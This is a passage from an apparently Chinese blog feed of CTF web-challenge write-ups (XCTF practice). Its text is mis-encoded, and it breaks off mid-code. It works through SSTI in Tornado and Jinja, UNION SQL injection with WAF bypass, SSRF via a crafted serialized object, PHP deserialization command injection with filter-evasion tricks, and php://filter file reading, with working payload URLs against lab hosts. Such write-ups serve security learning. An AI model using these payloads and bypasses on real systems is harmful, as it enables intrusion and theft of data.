class="line">http://61.147.171.105:61269/index.php?pat=/haha/e&amp;rep=phpinfo()&amp;sub=haha</span><br></pre></td></tr></table></figure><p>æŠ“åŒ…ï¼ŒåŠ å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">X-Forwarded-For: 127.0.0.1</span><br></pre></td></tr></table></figure><p>æˆåŠŸæ‰§è¡Œ<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181548625.png"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:61269/index.php?pat=/haha/e&amp;rep=system(&#x27;ls&#x27;)&amp;sub=haha</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181551079.png"><br>æŸ¥çœ‹sechahahaDirä¸‹å‘ç°å­˜åœ¨flagæ–‡ä»¶å¤¹,flagæ–‡ä»¶å¤¹é‡Œæœ‰flag.php<br>æŸ¥çœ‹flag.phpå¾—åˆ°flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181554265.png"></p><h2 id="6-easytornado-NO-GFSJ0723"><a href="#6-easytornado-NO-GFSJ0723" class="headerlink" title="6.easytornado-NO.GFSJ0723"></a>6.easytornado-NO.GFSJ0723</h2><p>flag.txt &#x3D;&gt; flagæ–‡ä»¶ &#x2F;fllllllllllllag<br>hints.txt &#x3D;&gt; md5(cookie_secret+md5(filename))</p><p>Tornado æ˜¯éé˜»å¡å¼å¿«é€ŸæœåŠ¡å™¨<br>å­˜åœ¨æ¼æ´</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. æ–‡ä»¶è¯»å–æ¼æ´</span><br><span class="line">2. æ¨¡æ¿æ³¨å…¥æ¼æ´</span><br><span class="line">3. è·¨ç«™æ”»å‡»,ä¼ªé€ cookie</span><br></pre></td></tr></table></figure><p>å…ˆæµ‹æ˜¯å¦å­˜åœ¨æ¨¡æ¿æ³¨å…¥<br>ç½‘ä¸ŠæŸ¥åˆ°tornadoæ¨¡æ¿å­˜åœ¨ä¸€äº›å¯è®¿é—®çš„å¿«é€Ÿå¯¹è±¡å¦‚</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>å°è¯•</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=&#123;&#123;1+1&#125;&#125;</span><br></pre></td></tr></table></figure><p>è·³åˆ°erroré¡µé¢<br>å°è¯•è®©msg&#x3D;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure><p>,æˆåŠŸè¯»å‡ºcookie_secret</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;autoreload&#x27;: True, &#x27;compiled_template_cache&#x27;: False, &#x27;cookie_secret&#x27;: &#x27;c4a4a033-ffb3-4991-bffd-7a96b7e8fc1a&#x27;&#125;</span><br></pre></td></tr></table></figure><p>é€šè¿‡hints.txtæ„é€ &#x2F;fllllllllllllagçš„filehash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">e617a328fadf4169c1e85c45c42d8c19</span><br><span class="line">è®¿é—®</span><br><span class="line">http://61.147.171.105:59636/file?filename=/fllllllllllllag&amp;filehash=e617a328fadf4169c1e85c45c42d8c19</span><br></pre></td></tr></table></figure><p>æˆåŠŸè¯»å–åˆ°flag</p><h2 id="7-shrine-NO-GFSJ0724"><a href="#7-shrine-NO-GFSJ0724" class="headerlink" title="7.shrine-NO.GFSJ0724"></a>7.shrine-NO.GFSJ0724</h2><p>è®¿é—®&#x2F;å¾—åˆ°æºç </p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask </span><br><span class="line"><span class="keyword">import</span> os </span><br><span class="line">app = flask.Flask(__name__) </span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>) </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>(): </span><br><span class="line"><span class="keyword">return</span> <span class="built_in">open</span>(__file__).read() </span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&#x27;</span></span>) </span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shrine</span>(<span class="params">shrine</span>): </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">safe_jinja</span>(<span class="params">s</span>): </span><br><span class="line">s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>) </span><br><span class="line">blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>] </span><br><span class="line"><span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s </span><br><span class="line"><span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine)) </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>: </span><br><span class="line">app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>å°è¯•è®¿é—®&#x2F;shrine&#x2F;å‘ç°å¤±è´¥,å°è¯•æ¨¡æ¿æ³¨å…¥</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56178/shrine/%7B%7B1+1%7D%7D</span><br></pre></td></tr></table></figure><p>è¢«æˆåŠŸæ‰§è¡Œ</p><p>FLAGè¢«å†™åœ¨configæ–‡ä»¶ä¸­,ä½†<br>()è¢«è¿‡æ»¤æƒ³æ‰¾ç±»æ‰ç”¨å‡½æ•°å‡ ä¹ä¸å¯èƒ½</p><p>çœ‹äº†å¤§ä½¬çš„wp:<br>å€ŸåŠ©current_app, è¿™æ˜¯å…¨å±€å˜é‡ä»£ç†,æŸ¥çœ‹å…¶configå³å¯</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure><p>æ‰¾åˆ°flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181614290.png"></p><h2 id="8-fakebook-NO-GFSJ0726"><a href="#8-fakebook-NO-GFSJ0726" class="headerlink" title="8.fakebook-NO.GFSJ0726"></a>8.fakebook-NO.GFSJ0726</h2><p>è®¿é—®robots.txt<br>å‘ç°Disallow: &#x2F;user.php.bak<br>è®¿é—®ä¸‹è½½user.phpå¤‡ä»½æ–‡ä»¶</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>getå‡½æ•°å­˜åœ¨ssrf</p><p>åˆ›å»ºç”¨æˆ·åè®¿é—®ç”¨æˆ·ç•Œé¢çŒœæµ‹å­˜åœ¨sqlæ³¨å…¥<br>é€šè¿‡order by è¯•å‡ºæ¥æœ‰4åˆ—<br>å°è¯•è”åˆæ³¨å…¥,å‘ç°æœ‰waf<br>é€šè¿‡/**/ç»•è¿‡</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,2,3,4%20--+</span><br></pre></td></tr></table></figure><p>å‘ç°2æ˜¯æ³¨å…¥ç‚¹<br>çˆ†è¡¨å&#x3D;&gt; users</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27fakebook%27),3,4%20--+</span><br></pre></td></tr></table></figure><p>çˆ†åˆ—å&#x3D;&gt;no, username,passwd,data</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27fakebook%27%20and%20table_name=%27users%27),3,4%20--+</span><br></pre></td></tr></table></figure><p>æŸ¥dataï¼Œå‘ç°ç”¨æˆ·æ•°æ®ä»¥åºåˆ—åŒ–å½¢å¼å­˜äºæ•°æ®åº“ä¸­</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">8</span>:<span class="string">&quot;UserInfo&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;s:<span class="number">4</span>:<span class="string">&quot;test&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;age&quot;</span>;i:<span class="number">11</span>;s:<span class="number">4</span>:<span class="string">&quot;blog&quot;</span>;s:<span class="number">8</span>:<span class="string">&quot;test.com&quot;</span>;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,(select%20group_concat(data)%20from%20users%20),3,4%20--+</span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä»åå°æŸ¥çœ‹æ•°æ®æ—¶,é¦–å…ˆä»æ•°æ®åº“ä¸­æå–å‡ºåºåˆ—åŒ–å­—ç¬¦ä¸²,å†å°†å…¶ååºåˆ—åŒ–,<br>å¯¹ååºåˆ—åŒ–åçš„å¯¹è±¡æå–å‡ºåšå®¢çš„é“¾æ¥,åœ¨åˆ©ç”¨curlå»è®¿é—®è¯¥é“¾æ¥</p><p>æ‰€ä»¥æˆ‘ä»¬å€ŸåŠ©è”åˆæ³¨å…¥,åœ¨ç¬¬å››ä½dataæ„é€ æ¶æ„ssrfè¯»å–flag.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> Â </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span>&#123;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&#x27;xrect1fy&#x27;</span>;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">114514</span>;</span><br><span class="line">Â  Â  <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;file:///var/www/html/flag.php&quot;</span>;</span><br><span class="line">&#125; Â </span><br><span class="line"><span class="variable">$xrect1fy</span> = <span class="keyword">new</span> <span class="title class_">UserInfo</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$xrect1fy</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è”åˆæ³¨å…¥dataä½ä¼ å…¥payload</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:56031/view.php?no=-1%20union/**/select%201,2,3,%27O:8:%22UserInfo%22:3:&#123;s:4:%22name%22;s:8:%22xrect1fy%22;s:3:%22age%22;i:114514;s:4:%22blog%22;s:29:%22file:///var/www/html/flag.php%22;&#125;%20%27%20--+</span><br></pre></td></tr></table></figure><p>iframeçš„src<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181656444.png"><br>è®¿é—®æºç å³æ˜¯flag<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308181656064.png"></p>]]></content>
      
      
      <categories>
          
          <category> ç½‘å®‰ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ”»é˜²ä¸–ç•Œç»ƒä¹ -CTFå…¥é—¨(ä¸€)</title>
      <link href="/2023/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%BB%83%E4%B9%A0-CTF%E5%85%A5%E9%97%A8/"/>
      <url>/2023/08/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E7%BB%83%E4%B9%A0-CTF%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="1-éš¾åº¦ä¸€"><a href="#1-éš¾åº¦ä¸€" class="headerlink" title="1.éš¾åº¦ä¸€"></a>1.éš¾åº¦ä¸€</h1><h2 id="1-unseping-NO-GFSJ1061"><a href="#1-unseping-NO-GFSJ1061" class="headerlink" title="1.unseping-NO.GFSJ1061"></a>1.unseping-NO.GFSJ1061</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$this</span>-&gt;method, <span class="keyword">array</span>(<span class="string">&quot;ping&quot;</span>))) &#123;</span><br><span class="line">    <span class="comment">#å›è°ƒå‡½æ•°</span></span><br><span class="line">    <span class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å‡½æ•°å,ç¬¬äºŒä¸ªå‚æ•°æ˜¯å‚æ•°</span></span><br><span class="line">    <span class="comment">#ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ping,ç¬¬äºŒä¸ªå‚æ•°æ˜¯æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line">            <span class="title function_ invoke__">call_user_func_array</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="variable">$this</span>-&gt;method), <span class="variable language_">$this</span>-&gt;args);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line"> <span class="comment">#å‘½ä»¤æ‰§è¡Œå‡½æ•°</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"><span class="variable">$ip</span></span>)</span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">exec</span>(<span class="variable">$ip</span>, <span class="variable">$result</span>);</span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="comment">#åŒ¹é…strä¸­çš„å…³é”®ä¿¡æ¯</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(\||&amp;|;| |\/|cat|flag|tac|php|ls)/&quot;</span>, <span class="variable">$str</span>, <span class="variable">$pat_array</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;don&#x27;t hack&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="comment">//å¾ªç¯éå†argsæ•°ç»„,å¯¹argsçš„æ¯ä¸ªå€¼éƒ½è°ƒç”¨wafå‡½æ•°è¿‡ä¸€é</span></span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable language_">$this</span>-&gt;args <span class="keyword">as</span> <span class="variable">$k</span> =&gt; <span class="variable">$v</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;args[<span class="variable">$k</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">waf</span>(<span class="variable">$v</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#POSTæ–¹å¼ä¼ å…¥ctf</span></span><br><span class="line"><span class="comment">#å¯¹ctfè¿›è¡Œååºåˆ—åŒ–</span></span><br><span class="line"><span class="variable">$ctf</span>=@<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">@<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="variable">$ctf</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>easeç±»æœ‰2ä¸ªå‚æ•°methodå’Œargs</p><p>ä¼ å…¥ctfå­—ç¬¦ä¸²å<br>ctfå­—ç¬¦ä¸²-&gt;base64è§£ç -&gt;__constructæ„é€ å‡½æ•°-&gt;__wakeupè°ƒç”¨wafå‡½æ•°è¿‡æ»¤str-&gt;__destruct-&gt;è°ƒç”¨pingå‡½æ•°,é€šè¿‡easeæ‰§è¡Œå‘½ä»¤</p><p>æ„é€ å­—ç¬¦ä¸²æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ease</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$method</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$args</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$args</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;method = <span class="variable">$method</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;args = <span class="variable">$args</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;ifconfig&quot;</span>));</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>ç»“æœæˆåŠŸæ‰§è¡Œifconfig:<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170941382.png"></p><p>ç”±äºå±è”½ls<br>åˆ™ä½¿ç”¨å•å¼•å·ç»•è¿‡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&quot;l&#x27;s&#x27;&quot;</span>));</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170942970.png"></p><p>æŸ¥çœ‹flag_1s_hereæ–‡ä»¶å¤¹ä¸‹çš„å†…å®¹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;l&quot;&quot;s$&#123;IFS&#125;f&quot;&quot;lag_1s_here&#x27;</span>));</span><br></pre></td></tr></table></figure><p>æ­¤å¤„å±è”½ç©ºæ ¼,ä½¿ç”¨${IFS}ç»•è¿‡,ç”±äºåŒå¼•å·ä¼šè§£æ${}ä¸­çš„å†…å®¹,æ‰€ä»¥ä½¿ç”¨å•å¼•å·æ„é€ å­—ç¬¦ä¸²<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170943593.png"></p><p>ç”¨catæŸ¥çœ‹flag_1s_hereä¸‹çš„phpæ–‡ä»¶<br>ç”±äº/è¢«å±è”½<br>ä½¿ç”¨printfç»•è¿‡</p><p>printf(å­—ç¬¦ä¸²è¿›åˆ¶ç»•è¿‡)<br>linuxä¸‹å¯ä»¥ç”¨``æ‰§è¡Œå‘½ä»¤<br>ä»è€Œæ„é€ </p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ease</span>(<span class="string">&quot;ping&quot;</span>,<span class="keyword">array</span>(<span class="string">&#x27;c&quot;&quot;at$&#123;IFS&#125;f&quot;&quot;lag_1s_here`printf$&#123;IFS&#125;&quot;\57&quot;`f&quot;&quot;lag_831b69012c67b35f.p&quot;&quot;hp&#x27;</span>));</span><br></pre></td></tr></table></figure><p>æ‹¿åˆ°key<br><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170944987.png"></p><h2 id="2-file-include-NO-GFSJ1060"><a href="#2-file-include-NO-GFSJ1060" class="headerlink" title="2.file_include-NO.GFSJ1060"></a>2.file_include-NO.GFSJ1060</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;./check.php&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$filename</span>  = <span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>è®©filename&#x3D;flag.phpå‘ç°æ²¡æœ‰å›æ˜¾<br>å°è¯•ç”¨ä¼ªåè®®è¯»å–</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure><p>å›æ˜¾do not hack æ¨æµ‹å‡ºæœ‰å…³é”®è¯è¢«å±è”½<br>ç»è¿‡æµ‹è¯•,å‘ç°ä¸ºread,base64,encode<br>convert.base64-encodeæ˜¯å¯¹å†…å®¹ç¼–ç æ“ä½œ,æ›¿æ¢ä¸ºå…¶ä»–ä¸å¸¦æœ‰encodeçš„è¿‡æ»¤å™¨<br>ä¾‹å¦‚ä½¿ç”¨å‹ç¼©è¿‡æ»¤å™¨convert.iconv.**<br>convert.iconv.&lt;input-encoding&gt;&lt;output-encoding&gt;</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filename=php://filter/convert.iconv.utf8.utf16/resource=flag.php</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Xrect1fy/picorep//img/202308170944313.png"></p><h2 id="3-easyphp-NO-GFSJ1059"><a href="#3-easyphp-NO-GFSJ1059" class="headerlink" title="3.easyphp-NO.GFSJ1059"></a>3.easyphp-NO.GFSJ1059</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$key1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$key2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">#açš„å€¼å¤§äº6000000å¹¶ä¸”açš„é•¿åº¦å°äºç­‰äº3</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$a</span>) &amp;&amp; <span class="title function_ invoke__">intval</span>(<span class="variable">$a</span>) &gt; <span class="number">6000000</span> &amp;&amp; <span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>) &lt;= <span class="number">3</span>)&#123;</span><br><span class="line"><span class="comment">#béœ€è¦æ»¡è¶³md5çš„å€¼çš„æˆªå–éƒ¨åˆ†ç­‰äº8b184b</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$b</span>) &amp;&amp; <span class="string">&#x27;8b184b&#x27;</span> === <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>),-<span class="number">6</span>,<span class="number">6</span>))&#123;</span><br><span class="line">        <span class="variable">$key1</span> = <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;Emmm...å†æƒ³æƒ³&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Emmm...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#cæ˜¯ä¼ å…¥çš„ä¸€ä¸ªjsonæ•°ç»„</span></span><br><span class="line"><span class="variable">$c</span>=(<span class="keyword">array</span>)<span class="title function_ invoke__">json_decode</span>(@<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]);</span><br><span class="line"><span 